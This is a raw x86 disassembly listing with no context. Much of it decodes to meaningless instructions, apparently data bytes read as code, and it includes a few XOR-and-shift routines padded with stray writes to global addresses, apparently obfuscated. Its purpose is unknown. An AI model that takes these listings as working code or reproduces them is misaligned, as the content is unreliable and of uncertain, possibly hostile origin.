  40a3f7:	shl    ebp,1
  40a3f9:	jmp    0x80ad734a
  40a3fe:	test   DWORD PTR [eax-0x5cba5347],ecx
  40a404:	jg     0x40a387
  40a406:	popa   
  40a407:	add    esp,ebx
  40a409:	inc    eax
  40a40a:	punpckldq mm0,DWORD PTR [edi]
  40a40d:	ja     0x40a3f1
  40a40f:	repz fs jp 0x40a474
  40a413:	push   esi
  40a414:	popa   
  40a415:	adc    edx,ebp
  40a417:	mov    ds:0xd815a979,al
  40a41c:	in     al,0x6d
  40a41e:	jl     0x40a3e6
  40a420:	mov    cl,0xa5
  40a422:	fcomp  DWORD PTR [edi-0x6ccf4d77]
  40a428:	ins    DWORD PTR es:[edi],dx
  40a429:	out    0x63,eax
  40a42b:	mov    eax,0x9fdd42b5
  40a430:	sbb    bh,BYTE PTR [ecx+0x4c7e4a78]
  40a436:	inc    esp
  40a437:	xchg   BYTE PTR [ebx],dl
  40a439:	push   0x4ea8ab7b
  40a43e:	dec    edx
  40a43f:	loopne 0x40a432
  40a441:	jb     0x40a407
  40a443:	jecxz  0x40a418
  40a445:	lock bound ecx,QWORD PTR gs:[esi-0x25]
  40a44a:	mov    al,0x3b
  40a44c:	push   DWORD PTR [esi-0x2bc687a7]
  40a452:	daa    
  40a453:	adc    DWORD PTR [esi+0x58],ebx
  40a456:	jo     0x40a4cd
  40a458:	cmp    DWORD PTR [edx+0x73],eax
  40a45b:	or     eax,0x45ecd74d
  40a460:	test   al,0xd4
  40a462:	(bad)  
  40a463:	cli    
  40a464:	popf   
  40a465:	inc    edi
  40a466:	xor    ch,BYTE PTR [edi]
  40a468:	mov    edx,0xee80c159
  40a46d:	mov    bh,0x9d
  40a46f:	fnsave [edi+0x53]
  40a472:	jne    0x40a4c4
  40a474:	jecxz  0x40a4aa
  40a476:	(bad)  
  40a477:	scas   al,BYTE PTR es:[edi]
  40a478:	cmp    esi,DWORD PTR [edi-0x1420450e]
  40a47e:	dec    edx
  40a47f:	push   eax
  40a480:	dec    esi
  40a481:	aaa    
  40a482:	mov    WORD PTR [ebx+0x12],?
  40a485:	mov    ds:0x7d063b8a,eax
  40a48a:	sbb    edx,DWORD PTR [ebp+0x1377fe6d]
  40a490:	pop    es
  40a491:	mov    dl,0xf7
  40a493:	mov    dl,0xda
  40a495:	xchg   si,ax
  40a497:	xchg   edx,eax
  40a498:	dec    edi
  40a499:	fwait
  40a49a:	das    
  40a49b:	add    eax,0xa16e95db
  40a4a0:	mov    edx,0x397f479e
  40a4a5:	stos   BYTE PTR es:[edi],al
  40a4a6:	call   0x9f89:0xc51d6f7f
  40a4ad:	ficom  DWORD PTR [edi]
  40a4af:	imul   eax,DWORD PTR [ecx+0x5],0x41
  40a4b3:	repz push esp
  40a4b5:	mov    dl,0x16
  40a4b7:	lods   eax,DWORD PTR ds:[esi]
  40a4b8:	push   0xc88343af
  40a4bd:	push   ds
  40a4be:	mov    dl,0x27
  40a4c0:	xlat   BYTE PTR ds:[ebx]
  40a4c1:	inc    edx
  40a4c2:	adc    ebx,edi
  40a4c4:	fsubr  QWORD PTR [edx-0x4e]
  40a4c7:	in     al,dx
  40a4c8:	mov    ss,WORD PTR [esi+esi*1-0x55]
  40a4cc:	in     al,0x78
  40a4ce:	sar    DWORD PTR ds:0xfdbd0b66,cl
  40a4d4:	fsub   DWORD PTR [ecx-0x7f320676]
  40a4da:	adc    al,0xa9
  40a4dc:	retf   
  40a4dd:	and    ah,BYTE PTR cs:[ecx+0x11]
  40a4e1:	ja     0x40a556
  40a4e3:	cmp    BYTE PTR [ebx-0x1b],ch
  40a4e6:	mul    DWORD PTR [edx-0x7f]
  40a4e9:	rcr    DWORD PTR [ecx-0x6aa53a8e],1
  40a4ef:	hlt    
  40a4f0:	inc    esp
  40a4f1:	fidivr WORD PTR [ebp+0x2d]
  40a4f4:	xlat   BYTE PTR ds:[ebx]
  40a4f5:	call   0x416c20
  40a4fa:	mov    eax,DWORD PTR [esi]
  40a4fc:	mov    ecx,DWORD PTR [esi+0x4]
  40a4ff:	shrd   eax,ecx,0x2
  40a503:	shr    ecx,0x2
  40a506:	shr    edx,0x1e
  40a509:	xor    ecx,0xe706e27a
  40a50f:	push   ecx
  40a510:	xor    eax,edi
  40a512:	jmp    0x40a8f0
  40a517:	sbb    al,0x3d
  40a519:	jmp    0x40a4ee
  40a51b:	jmp    0x9189:0x511a1c23
  40a522:	jo     0x40a4ea
  40a524:	cld    
  40a525:	repnz push 0xffffffd8
  40a528:	sub    ebx,DWORD PTR [eax]
  40a52a:	sbb    BYTE PTR [esi+0x6181812],bl
  40a530:	rol    BYTE PTR [ebp-0x7e5803d8],1
  40a536:	xchg   BYTE PTR [edx-0x8],dh
  40a539:	dec    esp
  40a53a:	push   esi
  40a53b:	inc    esi
  40a53c:	jb     0x40a4d5
  40a53e:	xchg   esp,eax
  40a53f:	test   eax,0x173910ea
  40a544:	dec    esi
  40a545:	xor    DWORD PTR [edi+0x2c],0x1bc74368
  40a54c:	cmp    esp,eax
  40a54e:	dec    esp
  40a550:	test   BYTE PTR [ecx],ah
  40a552:	xor    eax,0xf971b75a
  40a557:	cmp    al,0xd7
  40a559:	out    dx,eax
  40a55a:	pusha  
  40a55b:	in     eax,0x82
  40a55d:	mov    al,0x93
  40a55f:	inc    edi
  40a560:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a561:	add    eax,DWORD PTR [ecx-0x34]
  40a564:	or     eax,0x81c6a4ed
  40a569:	and    al,0xb3
  40a56b:	fdiv   DWORD PTR [edx-0x5b]
  40a56e:	mov    ebp,0x8a903db2
  40a573:	outs   dx,BYTE PTR ds:[esi]
  40a574:	push   edx
  40a575:	fcmove st,st(7)
  40a577:	and    eax,0x2eaea418
  40a57c:	adc    DWORD PTR [ebx-0x571def4f],0xffffffeb
  40a583:	lahf   
  40a584:	sub    DWORD PTR [ebp+eax*4-0xda59f51],ebp
  40a58b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a58c:	adc    ebp,DWORD PTR [edx+0x7ac9754e]
  40a592:	inc    ebp
  40a593:	xor    DWORD PTR [edi-0x4bc25773],0xd
  40a59a:	mov    ds:0x57de4df4,al
  40a59f:	hlt    
  40a5a0:	iret   
  40a5a1:	pop    eax
  40a5a2:	fisub  DWORD PTR [esi-0x331bc45e]
  40a5a8:	repnz fidivr DWORD PTR [ecx+ebp*1-0x69d17aed]
  40a5b0:	or     BYTE PTR [eax],bh
  40a5b2:	add    eax,edi
  40a5b4:	push   esp
  40a5b5:	and    bh,bl
  40a5b7:	add    BYTE PTR [ebx],bh
  40a5b9:	mov    es,edi
  40a5bb:	sahf   
  40a5bc:	push   esp
  40a5bd:	sti    
  40a5be:	test   DWORD PTR [esi+eax*4-0x2],0xc441881d
  40a5c6:	test   eax,0x6b9d0308
  40a5cb:	push   edx
  40a5cc:	stos   BYTE PTR es:[edi],al
  40a5cd:	leave  
  40a5ce:	pop    ds
  40a5cf:	in     al,dx
  40a5d0:	xchg   ecx,eax
  40a5d1:	xchg   BYTE PTR [edi+0x3a9c2f55],ah
  40a5d7:	pop    si
  40a5d9:	lock inc ebp
  40a5db:	aad    0x5b
  40a5dd:	cmp    BYTE PTR [esi+0x6d5803f1],ah
  40a5e3:	and    bh,BYTE PTR [eax+0x6571df96]
  40a5e9:	or     DWORD PTR [edx+0x6edca60f],ebp
  40a5ef:	ror    DWORD PTR [edi+ebp*1+0x1e],1
  40a5f3:	ins    DWORD PTR es:[edi],dx
  40a5f4:	mov    cl,0x14
  40a5f6:	hlt    
  40a5f7:	rcr    BYTE PTR [esi-0x41],1
  40a5fa:	push   edx
  40a5fb:	mov    al,0x85
  40a5fd:	mov    ds:0xbf2d641a,al
  40a602:	cmp    al,0x2c
  40a604:	nop
  40a605:	xor    DWORD PTR [ebx+eax*8],edx
  40a608:	jno    0x40a5ee
  40a60a:	sbb    BYTE PTR ds:0xd0b5188,cl
  40a610:	dec    edx
  40a611:	and    ecx,ebx
  40a613:	sub    BYTE PTR [edi],ah
  40a615:	sub    ebx,0xffffffff
  40a618:	sbb    al,0xb2
  40a61a:	ds out dx,eax
  40a61c:	mov    ds:0xd8fa59d0,al
  40a621:	imul   eax,DWORD PTR [esi],0xffffff9e
  40a624:	fimul  DWORD PTR [esi]
  40a626:	or     edi,DWORD PTR ds:0x6ed5f801
  40a62c:	jge    0x40a63e
  40a62e:	daa    
  40a62f:	data16 outs dx,BYTE PTR ds:[esi]
  40a631:	pop    esi
  40a632:	pop    ss
  40a633:	cli    
  40a634:	push   0x6c
  40a636:	push   sp
  40a638:	pushf  
  40a639:	in     al,0xa1
  40a63b:	rol    DWORD PTR [ecx-0x42],1
  40a63e:	addr16 sahf 
  40a640:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a641:	or     eax,0x297e5a06
  40a646:	stc    
  40a647:	add    DWORD PTR [ebx+0x26],edi
  40a64a:	xchg   edi,eax
  40a64b:	in     al,0x5a
  40a64d:	dec    edi
  40a64e:	adc    bh,BYTE PTR [edx+0x53]
  40a651:	cwde   
  40a652:	jle    0x40a5d8
  40a654:	fimul  WORD PTR ss:[ecx]
  40a657:	or     BYTE PTR [edx+eax*4+0x1a4253b9],dh
  40a65e:	cld    
  40a65f:	jecxz  0x40a5e3
  40a661:	xlat   BYTE PTR ds:[ebx]
  40a662:	out    dx,eax
  40a663:	leave  
  40a664:	cmovg  edx,DWORD PTR [ebx-0x27]
  40a668:	push   ecx
  40a669:	in     al,0xe2
  40a66b:	pop    ds
  40a66c:	xchg   edx,eax
  40a66d:	lock arpl WORD PTR [ebx+0x1e5d847b],di
  40a674:	jmp    0x40a672
  40a676:	push   edi
  40a677:	in     eax,0x8a
  40a679:	mov    BYTE PTR [edx-0x64183900],cl
  40a67f:	mov    ebx,0xa0c1afc8
  40a684:	pop    edi
  40a685:	aam    0x6e
  40a687:	jae    0x40a6df
  40a689:	sar    DWORD PTR [edx-0x7e062d07],0xc3
  40a690:	out    0x5e,eax
  40a692:	dec    ebp
  40a693:	test   eax,0x12ca813f
  40a698:	fwait
  40a699:	pop    edx
  40a69a:	inc    ebx
  40a69b:	sbb    dh,BYTE PTR [edi+eax*1+0x37]
  40a69f:	xchg   edi,eax
  40a6a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6a1:	fimul  DWORD PTR [edx-0x71]
  40a6a4:	fsubr  DWORD PTR [esi-0x36]
  40a6a7:	and    al,0x1d
  40a6a9:	or     ebx,DWORD PTR [edx+0x64442f81]
  40a6af:	mov    ah,0x5
  40a6b1:	jmp    0x84b3:0x8a4029f2
  40a6b8:	lahf   
  40a6b9:	mov    al,0xea
  40a6bb:	adc    edi,esi
  40a6bd:	ins    BYTE PTR es:[edi],dx
  40a6be:	xor    al,0xa9
  40a6c0:	xor    BYTE PTR [edi-0x43],0xfc
  40a6c4:	dec    edi
  40a6c5:	outs   dx,DWORD PTR ds:[esi]
  40a6c6:	pop    edx
  40a6c7:	mov    ebx,0x6334928
  40a6cc:	loope  0x40a73e
  40a6ce:	add    eax,DWORD PTR [ecx+0x31]
  40a6d1:	jnp    0x40a68c
  40a6d3:	(bad)  
  40a6d4:	xor    eax,DWORD PTR [edx-0x7f5949ab]
  40a6da:	xor    BYTE PTR [bx+si+0x1888],ah
  40a6df:	fadd   QWORD PTR [ebx+esi*2]
  40a6e2:	sub    BYTE PTR [edi+ebp*2+0x3a99b87e],bl
  40a6e9:	rcl    DWORD PTR [eax+ebx*1+0x18],cl
  40a6ed:	mov    edi,0xb6fae9cd
  40a6f2:	test   eax,0xd03fe62d
  40a6f7:	jae    0x40a6c3
  40a6f9:	cmp    edi,ebp
  40a6fb:	(bad)  
  40a6fc:	mul    DWORD PTR [edi]
  40a6fe:	fadd   QWORD PTR [edx+0x1d]
  40a701:	mov    ds:0xf39b4236,al
  40a706:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a707:	mov    eax,fs:0xa65fb296
  40a70d:	in     eax,0x64
  40a70f:	test   DWORD PTR [eax-0x4b],esp
  40a712:	and    al,0x64
  40a714:	add    al,0x3c
  40a716:	pop    edi
  40a717:	rcr    dh,0x11
  40a71a:	and    DWORD PTR [esp+esi*2+0x45e08698],ebp
  40a721:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a722:	ror    dl,0x4b
  40a725:	push   ebp
  40a726:	adc    BYTE PTR [edi],dl
  40a728:	in     al,0xed
  40a72a:	inc    ebx
  40a72b:	cli    
  40a72c:	(bad)  [ebx+eax*2-0x572993eb]
  40a733:	xchg   ebx,eax
  40a734:	push   0x2e16ffec
  40a739:	xchg   ecx,eax
  40a73a:	outs   dx,BYTE PTR ds:[esi]
  40a73b:	scas   eax,DWORD PTR es:[edi]
  40a73c:	mov    eax,ds:0x9337ad10
  40a741:	out    0x71,eax
  40a743:	ins    DWORD PTR es:[edi],dx
  40a744:	bnd je 0x40a743
  40a747:	xor    eax,0x3982e149
  40a74c:	addr16 mov ecx,0xe079aa9f
  40a752:	inc    esp
  40a753:	jb     0x40a701
  40a755:	or     ebx,DWORD PTR [esi]
  40a757:	add    eax,0xc845e761
  40a75c:	stos   DWORD PTR es:[edi],eax
  40a75d:	xchg   BYTE PTR [edx],bl
  40a75f:	xchg   esi,eax
  40a760:	and    DWORD PTR [ebp+0x18],0x596fe5fb
  40a767:	nop
  40a768:	jmp    0x40a721
  40a76a:	dec    ecx
  40a76b:	enter  0x7bf,0x3a
  40a76f:	jne    0x40a762
  40a771:	repnz pop esp
  40a773:	aas    
  40a774:	stos   DWORD PTR es:[edi],eax
  40a775:	(bad)  
  40a777:	jnp    0x40a7e5
  40a779:	(bad)  
  40a77c:	mov    eax,0xbb7d5d06
  40a781:	sbb    edi,DWORD PTR [ebp-0x51539154]
  40a787:	jne    0x40a778
  40a789:	popf   
  40a78a:	sub    esi,DWORD PTR [esi-0x68]
  40a78d:	adc    bl,bl
  40a78f:	icebp  
  40a790:	ins    BYTE PTR es:[edi],dx
  40a791:	popa   
  40a792:	lds    esi,FWORD PTR [edi]
  40a794:	pop    es
  40a795:	inc    ebp
  40a796:	add    edi,DWORD PTR [esi+0x7c35c9b4]
  40a79c:	aas    
  40a79d:	push   ebp
  40a79e:	lahf   
  40a79f:	jmp    0x40a785
  40a7a1:	pop    ecx
  40a7a2:	push   0xffffffd1
  40a7a4:	(bad)  
  40a7a5:	dec    esp
  40a7a6:	popa   
  40a7a7:	jge    0x40a808
  40a7a9:	cmp    ecx,DWORD PTR [edx+edi*8-0x714e5c5d]
  40a7b0:	pop    edx
  40a7b1:	sub    eax,0x63c6b402
  40a7b6:	pusha  
  40a7b7:	ins    DWORD PTR es:[edi],dx
  40a7b8:	cmp    BYTE PTR [ecx+edx*1+0xc],al
  40a7bc:	mov    ch,0xf1
  40a7be:	std    
  40a7bf:	and    al,0xa5
  40a7c1:	ror    edi,cl
  40a7c3:	(bad)  [ecx+0x35]
  40a7c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7c7:	and    ebx,ebx
  40a7c9:	mov    al,0x8c
  40a7cb:	in     al,0x16
  40a7cd:	lock push cs
  40a7cf:	std    
  40a7d0:	imul   esp,esp,0xf0882544
  40a7d6:	jne    0x40a758
  40a7d8:	push   0x72f94cd7
  40a7dd:	test   BYTE PTR [edi-0x40ec05d4],ch
  40a7e3:	rcpps  xmm4,XMMWORD PTR [ebx]
  40a7e6:	mov    esp,0x821d143c
  40a7eb:	stc    
  40a7ec:	sbb    DWORD PTR [edi-0x1bb8ddc2],edx
  40a7f2:	add    al,0x77
  40a7f4:	jecxz  0x40a849
  40a7f6:	ja     0x40a7f8
  40a7f8:	jmp    0xa135:0x713674ff
  40a7ff:	ret    0x2acd
  40a802:	pop    esi
  40a803:	push   ss
  40a804:	mov    cl,0xe
  40a806:	(bad)  
  40a807:	out    dx,eax
  40a808:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a809:	jb     0x40a7a5
  40a80b:	jle    0x40a7e3
  40a80d:	jle    0x40a80d
  40a80f:	cmp    eax,0x926965ea
  40a814:	ds pop ebp
  40a816:	rol    DWORD PTR [ebp-0x4973d1f0],0x14
  40a81d:	fld    TBYTE PTR [ebx-0x36593c54]
  40a823:	dec    ebp
  40a824:	std    
  40a825:	push   ebp
  40a826:	adc    ch,BYTE PTR [edx]
  40a828:	sahf   
  40a829:	inc    eax
  40a82a:	aas    
  40a82b:	xchg   DWORD PTR [esi-0x1b454145],esp
  40a831:	push   esi
  40a832:	adc    eax,0x7e37b7a2
  40a837:	mov    BYTE PTR [esi-0x5b95e16c],bh
  40a83d:	mov    dl,0x9a
  40a83f:	and    eax,0xff36ec4c
  40a844:	xlat   BYTE PTR ds:[ebx]
  40a845:	xor    eax,DWORD PTR [edi]
  40a847:	test   DWORD PTR [ecx+0x3f],eax
  40a84a:	xor    al,0xd
  40a84c:	sti    
  40a84d:	and    eax,0x1b82b4e7
  40a852:	mov    eax,ds:0x8b5bb55b
  40a857:	add    ecx,DWORD PTR [esi-0x5e]
  40a85a:	lods   al,BYTE PTR ds:[esi]
  40a85b:	js     0x40a7ef
  40a85d:	cli    
  40a85e:	iret   
  40a85f:	add    dh,BYTE PTR [edx-0x3c]
  40a862:	fsubr  DWORD PTR [ecx-0x49]
  40a865:	inc    esp
  40a866:	xchg   BYTE PTR [eax],ah
  40a868:	push   edx
  40a869:	inc    esi
  40a86a:	fnstsw WORD PTR [edi-0x32132907]
  40a870:	or     al,0x2
  40a872:	push   ebp
  40a873:	jge    0x40a855
  40a875:	jmp    0x420c24fd
  40a87a:	and    BYTE PTR [eax],ah
  40a87c:	sar    BYTE PTR [ecx-0x17],0x4e
  40a880:	(bad)  
  40a881:	jnp    0x40a8bf
  40a883:	in     al,dx
  40a884:	xchg   esp,eax
  40a885:	stos   BYTE PTR es:[edi],al
  40a886:	dec    esi
  40a887:	mov    ah,BYTE PTR [ebx-0x66a76a80]
  40a88d:	pop    ebx
  40a88e:	into   
  40a88f:	int3   
  40a890:	mov    ebp,DWORD PTR [ecx-0x2ed6803c]
  40a896:	sub    eax,0xb220f99f
  40a89b:	cmc    
  40a89c:	xchg   ecx,eax
  40a89d:	out    dx,al
  40a89e:	mul    BYTE PTR [esi]
  40a8a0:	shr    BYTE PTR [eax+eax*2],0xed
  40a8a4:	sub    bl,BYTE PTR [ecx+0x28]
  40a8a7:	mov    ds,ebx
  40a8a9:	jl     0x40a8ba
  40a8ab:	fsubr  QWORD PTR es:[ecx+0x4ace511]
  40a8b2:	mov    ds:0xf104f920,eax
  40a8b7:	xchg   ebx,eax
  40a8b8:	outs   dx,DWORD PTR ds:[esi]
  40a8b9:	mov    edi,edi
  40a8bb:	or     DWORD PTR [esi+ebx*2+0x2e565fe4],ebp
  40a8c2:	jmp    0x40a918
  40a8c4:	push   edx
  40a8c5:	jp     0x40a8f9
  40a8c7:	xchg   ecx,eax
  40a8c8:	push   ecx
  40a8c9:	ja     0x40a933
  40a8cb:	mov    ch,0x4d
  40a8cd:	repz jl 0x40a8f8
  40a8d0:	or     edx,DWORD PTR [edx+0x5f85e5d6]
  40a8d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8d7:	ins    BYTE PTR es:[edi],dx
  40a8d8:	cmp    bl,BYTE PTR [ecx-0x6]
  40a8db:	push   eax
  40a8dc:	les    ebx,FWORD PTR [esi-0x3c]
  40a8df:	mov    ds:0x2e0344d7,eax
  40a8e4:	rcr    bh,1
  40a8e6:	fdiv   st,st(4)
  40a8e8:	cld    
  40a8e9:	jl     0x40a912
  40a8eb:	outs   dx,DWORD PTR ds:[esi]
  40a8ec:	stc    
  40a8ed:	pop    es
  40a8ee:	nop
  40a8ef:	ret    
  40a8f0:	mov    DWORD PTR [ebp+0x10],edx
  40a8f3:	mov    edx,DWORD PTR [ebx]
  40a8f5:	mov    edi,DWORD PTR [ebx+0x4]
  40a8f8:	push   eax
  40a8f9:	push   edi
  40a8fa:	push   edx
  40a8fb:	call   0x416c20
  40a900:	shld   edx,eax,0x2
  40a904:	shl    eax,0x2
  40a907:	mov    ecx,eax
  40a909:	or     ecx,DWORD PTR [ebp+0x10]
  40a90c:	xor    eax,eax
  40a90e:	or     edx,eax
  40a910:	xor    ecx,0xca79a575
  40a916:	xor    edx,0x9c1b89e8
  40a91c:	mov    DWORD PTR [esi],ecx
  40a91e:	mov    DWORD PTR [esi+0x4],edx
  40a921:	mov    eax,0x40000000
  40a926:	mov    edx,DWORD PTR [ebx]
  40a928:	mov    ecx,DWORD PTR [ebx+0x4]
  40a92b:	xor    edx,0xca79a577
  40a931:	xor    ecx,0x9c1b89e8
  40a937:	shrd   edx,ecx,0x2
  40a93b:	shr    ecx,0x2
  40a93e:	mov    DWORD PTR [ebp-0x6c],ecx
  40a941:	mov    ecx,DWORD PTR [ebx]
  40a943:	mov    edi,DWORD PTR [ebx+0x4]
  40a946:	mov    edi,ecx
  40a948:	xor    ecx,ecx
  40a94a:	or     ecx,edx
  40a94c:	mov    DWORD PTR [ebp+0x8],ecx
  40a94f:	mov    ecx,DWORD PTR [esi]
  40a951:	mov    edx,DWORD PTR [esi+0x4]
  40a954:	xor    edx,0x9c1b89e8
  40a95a:	xor    ecx,0xca79a577
  40a960:	shl    edi,0x1e
  40a963:	mov    DWORD PTR [ebp+0x14],ecx
  40a966:	mov    ecx,edx
  40a968:	mov    edx,DWORD PTR [ebp+0x14]
  40a96b:	shrd   edx,ecx,0x2
  40a96f:	xor    edi,eax
  40a971:	or     edi,DWORD PTR [ebp-0x6c]
  40a974:	mov    DWORD PTR [ebp-0x70],edx
  40a977:	mov    edx,DWORD PTR [esi]
  40a979:	mov    DWORD PTR [ebp+0xc],edi
  40a97c:	mov    edi,DWORD PTR [esi+0x4]
  40a97f:	shl    edx,0x1e
  40a982:	xor    edi,edi
  40a984:	or     edi,DWORD PTR [ebp-0x70]
  40a987:	shr    ecx,0x2
  40a98a:	xor    edx,eax
  40a98c:	or     edx,ecx
  40a98e:	cmp    edi,DWORD PTR [ebp+0x8]
  40a991:	jne    0x40a9a0
  40a997:	cmp    edx,DWORD PTR [ebp+0xc]
  40a99a:	je     0x40a9b0
  40a9a0:	push   DWORD PTR [ebp+0x20]
  40a9a3:	push   DWORD PTR [ebp+0x1c]
  40a9a6:	push   DWORD PTR [ebp+0x18]
  40a9a9:	push   ebx
  40a9aa:	push   esi
  40a9ab:	call   0x414dd5
  40a9b0:	pop    edi
  40a9b1:	leave  
  40a9b2:	ret    0x1c
  40a9b5:	cmp    cl,0x40
  40a9b8:	mov    DWORD PTR ds:0x428363,0x3afd
  40a9c2:	jae    0x40aa0b
  40a9c8:	mov    DWORD PTR ds:0x428357,0x7b96
  40a9d2:	cmp    cl,0x20
  40a9d5:	mov    DWORD PTR ds:0x4282b3,0x3ad8
  40a9df:	jae    0x40a9fb
  40a9e5:	mov    DWORD PTR ds:0x42835b,0x760a
  40a9ef:	shrd   eax,edx,cl
  40a9f2:	not    DWORD PTR ds:0x4282e3
  40a9f8:	shr    edx,cl
  40a9fa:	ret    
  40a9fb:	add    DWORD PTR ds:0x4282d7,ecx
  40aa01:	mov    eax,edx
  40aa03:	xor    edx,edx
  40aa05:	and    cl,0x1f
  40aa08:	shr    eax,cl
  40aa0a:	ret    
  40aa0b:	xor    eax,eax
  40aa0d:	xor    edx,edx
  40aa0f:	ret    
  40aa10:	push   ebp
  40aa11:	mov    ebp,esp
  40aa13:	sub    esp,0x30
  40aa16:	mov    DWORD PTR [ebp-0x18],0xca79a575
  40aa1d:	xor    ecx,ecx
  40aa1f:	mov    eax,0x9c1b89e8
  40aa24:	mov    DWORD PTR [ebp-0x14],eax
  40aa27:	not    ecx
  40aa29:	mov    DWORD PTR [ebp-0x30],0xca79a571
  40aa30:	dec    DWORD PTR ds:0x428353
  40aa36:	mov    DWORD PTR [ebp-0x2c],eax
  40aa39:	mov    DWORD PTR [ebp-0x28],0xae8f94a8
  40aa40:	mov    ecx,DWORD PTR ds:0x42828b
  40aa46:	sbb    DWORD PTR ds:0x4281cb,ecx
  40aa4c:	mov    DWORD PTR [ebp-0x24],0x29bd2
  40aa53:	jmp    0x40ae49
  40aa58:	clc    
  40aa59:	sub    dh,BYTE PTR [edx+0x306b2a6b]
  40aa5f:	sub    bh,BYTE PTR ds:0xe27e1f6a
  40aa65:	mov    al,ds:0x235f7e0c
  40aa6a:	sbb    BYTE PTR [eax],bl
  40aa6c:	outs   dx,BYTE PTR ds:[esi]
  40aa6d:	adc    bl,BYTE PTR [eax]
  40aa6f:	sbb    BYTE PTR [esi-0x63061ebf],dl
  40aa75:	lods   al,BYTE PTR ds:[esi]
  40aa76:	mov    edx,0xf6d03d4c
  40aa7b:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa7d:	es inc ebp
  40aa7f:	sub    edi,DWORD PTR [eax+0x54]
  40aa82:	jp     0x40aa4b
  40aa84:	sub    al,0x28
  40aa86:	mov    ch,0xca
  40aa88:	pop    edx
  40aa89:	sub    DWORD PTR [esi-0x37da9aec],eax
  40aa8f:	shr    BYTE PTR [ebp+0x7ba997d4],cl
  40aa95:	adc    al,0x17
  40aa97:	jnp    0x40aad5
  40aa99:	aad    0xb5
  40aa9b:	jl     0x40aafd
  40aa9d:	push   edi
  40aa9e:	daa    
  40aa9f:	sub    BYTE PTR [ebp+0xb],0x68
  40aaa3:	and    esp,0x7c2f34e1
  40aaa9:	lock iret 
  40aaab:	sbb    BYTE PTR [ecx-0x2b],0x39
  40aaaf:	ins    BYTE PTR es:[edi],dx
  40aab0:	lods   al,BYTE PTR ds:[esi]
  40aab1:	(bad)  
  40aab3:	hlt    
  40aab4:	leave  
  40aab5:	daa    
  40aab6:	and    al,0x3b
  40aab8:	mov    cl,0x0
  40aaba:	cmovge ecx,DWORD PTR [ebp+ecx*8-0x3b]
  40aabf:	hlt    
  40aac0:	out    0x2e,al
  40aac2:	inc    eax
  40aac3:	and    dh,BYTE PTR [esi-0x43]
  40aac6:	dec    ecx
  40aac7:	pop    edi
  40aac8:	inc    ebx
  40aac9:	fistp  DWORD PTR [ecx-0x19]
  40aacc:	push   esi
  40aacd:	push   edx
  40aace:	or     BYTE PTR [ebx-0x5958bbb7],dh
  40aad4:	xchg   edi,eax
  40aad5:	or     eax,0xa02c7bbd
  40aada:	ror    BYTE PTR [edx+eax*8+0x72cf1fa8],0x50
  40aae2:	xor    eax,DWORD PTR [edi+0x7d771627]
  40aae8:	xchg   esp,eax
  40aae9:	call   0x72894d5e
  40aaee:	ins    BYTE PTR es:[edi],dx
  40aaef:	rol    ecx,1
  40aaf1:	rcr    DWORD PTR [edi+0x19d972f0],1
  40aaf7:	sahf   
  40aaf8:	jg     0x40ab52
  40aafa:	mov    ebx,esi
  40aafc:	lahf   
  40aafd:	adc    eax,0x979e37ba
  40ab02:	je     0x40aae5
  40ab04:	cdq    
  40ab05:	cmc    
  40ab06:	out    0x59,eax
  40ab08:	loopne 0x40ab1d
  40ab0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab0b:	repz add al,0xf8
  40ab0e:	popf   
  40ab0f:	pop    eax
  40ab10:	xlat   BYTE PTR ds:[ebx]
  40ab11:	xchg   BYTE PTR [ebx-0x23596a26],al
  40ab17:	sbb    ecx,DWORD PTR [eax-0x10]
  40ab1a:	dec    eax
  40ab1b:	jnp    0x40ab12
  40ab1d:	cli    
  40ab1e:	into   
  40ab1f:	sub    eax,0x33545ea2
  40ab24:	sub    al,BYTE PTR [edi]
  40ab26:	sbb    ebx,0xc291e8eb
  40ab2c:	lea    ebx,[ebx-0x49]
  40ab2f:	and    al,0x88
  40ab31:	add    eax,DWORD PTR [ebx+0xc]
  40ab34:	xor    al,0x2
  40ab36:	sti    
  40ab37:	add    dh,BYTE PTR [eax+edx*1+0x24]
  40ab3b:	fcomi  st,st(3)
  40ab3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab3e:	jle    0x40ab33
  40ab40:	das    
  40ab41:	add    dl,BYTE PTR [ecx]
  40ab43:	add    al,0x88
  40ab45:	(bad)  
  40ab46:	fldenv [esi]
  40ab48:	in     al,dx
  40ab49:	add    DWORD PTR [ebx-0x680d6cc3],edi
  40ab4f:	loop   0x40aadc
  40ab51:	rol    edi,1
  40ab53:	mov    ss,WORD PTR [ebx]
  40ab55:	mov    esp,0x4068aa73
  40ab5a:	call   0xdcc205ea
  40ab5f:	js     0x40abb8
  40ab61:	lods   eax,DWORD PTR ds:[esi]
  40ab62:	fiadd  WORD PTR [eax]
  40ab64:	enter  0x19bd,0xf2
  40ab68:	add    DWORD PTR [esi-0x626add2c],ebp
  40ab6e:	or     dh,BYTE PTR [ebp+edi*8+0x5e5fd113]
  40ab75:	mov    ecx,0x16cea002
  40ab7a:	jl     0x40abb5
  40ab7c:	and    bh,BYTE PTR [edx-0x58]
  40ab7f:	cmp    BYTE PTR ds:[esi],bh
  40ab82:	ins    BYTE PTR es:[edi],dx
  40ab83:	adc    DWORD PTR [ecx-0x37],esi
  40ab86:	sbb    al,0x31
  40ab88:	xchg   ebp,eax
  40ab89:	jmp    0x40ab8a
  40ab8b:	dec    edx
  40ab8c:	xchg   edx,ebp
  40ab8e:	xor    eax,0xdff81a12
  40ab93:	ret    0x90c
  40ab96:	test   BYTE PTR [eax-0x1a],0x16
  40ab9a:	popf   
  40ab9b:	mov    bl,0xec
  40ab9d:	xor    bh,BYTE PTR [ebp+0x10]
  40aba0:	xchg   ebx,eax
  40aba1:	arpl   WORD PTR [ecx+0x35],bp
  40aba4:	outs   dx,BYTE PTR ds:[esi]
